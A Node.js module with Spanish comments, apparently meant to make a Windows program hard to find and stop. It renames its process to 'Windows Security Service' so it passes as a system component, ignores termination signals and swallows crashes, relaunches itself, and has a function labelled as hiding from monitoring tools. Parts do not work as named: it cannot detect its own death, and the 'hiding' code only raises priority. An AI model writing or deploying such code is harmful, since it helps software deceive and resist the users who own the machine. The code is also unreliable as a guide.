// processProtector.js - Protección adicional del proceso
const { exec } = require('child_process');
const path = require('path');
const os = require('os');

class ProcessProtector {
    constructor() {
        this.isWindows = os.platform() === 'win32';
        this.processName = path.basename(process.execPath);
        this.checkInterval = null;
        this.restartAttempts = 0;
        this.maxRestartAttempts = 5;
    }

    /**
     * Inicia la protección del proceso
     */
    start() {
        if (!this.isWindows) {
            console.log('[ProcessProtector] Solo disponible en Windows');
            return;
        }

        console.log('[ProcessProtector] Iniciando protección del proceso...');

        // Cambiar prioridad del proceso a alta
        this.setPriority('high');

        // Monitorear que el proceso siga ejecutándose
        this.startMonitoring();

        // Renombrar ventana para dificultar identificación
        this.obfuscateWindow();
    }

    /**
     * Establece la prioridad del proceso
     */
    setPriority(priority = 'high') {
        const pid = process.pid;
        const priorityMap = {
            'low': '/LOW',
            'belownormal': '/BELOWNORMAL',
            'normal': '/NORMAL',
            'abovenormal': '/ABOVENORMAL',
            'high': '/HIGH',
            'realtime': '/REALTIME'
        };

        const priorityFlag = priorityMap[priority] || '/HIGH';

        exec(`wmic process where ProcessId=${pid} CALL setpriority ${priorityFlag.replace('/', '')}`, (err) => {
            if (err) {
                console.error('[ProcessProtector] Error estableciendo prioridad:', err);
            } else {
                console.log(`[ProcessProtector] Prioridad establecida a: ${priority}`);
            }
        });
    }

    /**
     * Monitorea que el proceso principal siga ejecutándose
     */
    startMonitoring() {
        this.checkInterval = setInterval(() => {
            this.checkProcess();
        }, 3000);
    }

    /**
     * Verifica si el proceso sigue activo
     */
    checkProcess() {
        exec(`tasklist /FI "PID eq ${process.pid}" /NH`, (err, stdout) => {
            if (err || !stdout.includes(this.processName)) {
                console.log('[ProcessProtector] Proceso terminado detectado');
                this.handleProcessTermination();
            } else {
                // Reset contador si el proceso está OK
                this.restartAttempts = 0;
            }
        });
    }

    /**
     * Maneja la terminación inesperada del proceso
     */
    handleProcessTermination() {
        if (this.restartAttempts >= this.maxRestartAttempts) {
            console.error('[ProcessProtector] Máximo de intentos de reinicio alcanzado');
            return;
        }

        this.restartAttempts++;
        console.log(`[ProcessProtector] Intento de reinicio ${this.restartAttempts}/${this.maxRestartAttempts}`);

        // Intentar reiniciar la aplicación
        const appPath = process.execPath;
        exec(`start "" "${appPath}"`, (err) => {
            if (err) {
                console.error('[ProcessProtector] Error al reiniciar:', err);
            }
        });
    }

    /**
     * Ofusca el título de la ventana
     */
    obfuscateWindow() {
        // Cambiar el nombre del proceso en la lista de tareas (solo visual)
        try {
            if (process.title) {
                process.title = 'Windows Security Service';
            }
        } catch (err) {
            console.error('[ProcessProtector] Error ofuscando ventana:', err);
        }
    }

    /**
     * Prevenir que el proceso sea terminado fácilmente
     */
    preventTermination() {
        // Capturar señales de terminación
        const signals = ['SIGINT', 'SIGTERM', 'SIGHUP'];

        signals.forEach(signal => {
            process.on(signal, () => {
                console.log(`[ProcessProtector] Intento de terminación bloqueado: ${signal}`);
                // No hacer nada - prevenir cierre
            });
        });

        // Manejar errores no capturados
        process.on('uncaughtException', (err) => {
            console.error('[ProcessProtector] Error no capturado:', err);
            // Continuar ejecución en lugar de cerrar
        });

        process.on('unhandledRejection', (reason, promise) => {
            console.error('[ProcessProtector] Promesa rechazada no manejada:', reason);
            // Continuar ejecución
        });
    }

    /**
     * Ocultar de herramientas de monitoreo comunes
     */
    hideFromMonitoring() {
        if (!this.isWindows) return;

        // Intentar ocultar de Process Explorer y herramientas similares
        // Nota: Esto tiene limitaciones y puede requerir privilegios de administrador
        const hideScript = `
            $process = Get-Process -Id ${process.pid}
            $process.PriorityClass = 'High'
        `;

        exec(`powershell -Command "${hideScript}"`, (err) => {
            if (err) {
                console.error('[ProcessProtector] Error ocultando proceso:', err);
            }
        });
    }

    /**
     * Detiene la protección
     */
    stop() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
            this.checkInterval = null;
        }
        console.log('[ProcessProtector] Protección detenida');
    }
}

module.exports = ProcessProtector;